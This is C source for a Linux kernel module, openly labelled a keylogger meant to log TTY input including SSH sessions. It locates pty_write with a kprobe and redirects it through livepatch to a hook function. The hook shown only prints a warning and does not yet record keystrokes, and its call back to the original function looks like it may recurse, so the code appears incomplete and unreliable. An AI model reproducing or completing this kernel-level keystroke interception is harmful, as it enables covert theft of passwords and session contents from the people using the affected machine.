#include <linux/types.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/kprobes.h>
#include <linux/livepatch.h>
#include <linux/module.h>
#include <linux/tty.h>
#include <linux/tty_driver.h>

static ssize_t (*o_pty_write)(struct tty_struct *, const u8 *, size_t);

static ssize_t hooked_write(struct tty_struct *tty, const u8 *buf, size_t len)
{
	pr_info("TTY hook. Warning: Nested call.\n");
	return o_pty_write(tty, buf, len);
}

// should be .old_name (not .old_func)
static struct klp_func lpf[] = { { .old_name = "pty_write",
				   .new_func = hooked_write }, {} };
static struct klp_object lpo[] = { { .funcs = lpf }, {} };
static struct klp_patch lpp = { .mod = THIS_MODULE, .objs = lpo };

static int keylogger_init(void)
{
	struct kprobe kp = { .symbol_name = "pty_write" };
	if (register_kprobe(&kp) < 0)
		return 0;

	o_pty_write = (ssize_t (*)(struct tty_struct *, const u8 *, size_t))kp.addr;
	unregister_kprobe(&kp);

	pr_info("pty_write %px\n", o_pty_write);
	pr_info("TTY keylogger module loaded\n");
	klp_enable_patch(&lpp);
	return 0;
}

static void keylogger_exit(void)
{
	pr_info("TTY keylogger module unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);
MODULE_LICENSE("GPL");
MODULE_INFO(livepatch, "Y");
MODULE_DESCRIPTION("A kernel module to log TTY inputs including SSH");
